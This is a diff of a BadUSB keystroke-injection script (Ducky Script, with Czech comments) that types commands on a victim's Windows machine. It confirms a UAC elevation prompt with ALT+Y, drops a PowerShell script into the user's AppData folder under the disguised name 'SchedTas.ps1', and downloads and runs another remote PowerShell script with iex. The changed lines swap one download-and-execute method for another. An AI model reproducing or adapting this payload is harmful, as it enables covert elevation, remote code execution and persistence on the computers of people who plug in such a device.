@@ -15,7 +15,8 @@ REM Stisknutí kláves pro potvrzení UAC (pokud je v angličtině – může b�
 ALT y
 DELAY 1000
 
-REM Stáhne soubor a spustí ho s vypnutou execution policy
-STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra.ps1")
-STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Volkswagen.ps1")
+REM Stáhne soubor a spustí ho
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1" -OutFile "$env:APPDATA\SchedTas.ps1"
+ENTER
+STRING iex (curl https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Volkswagen.ps1); exit
 ENTER
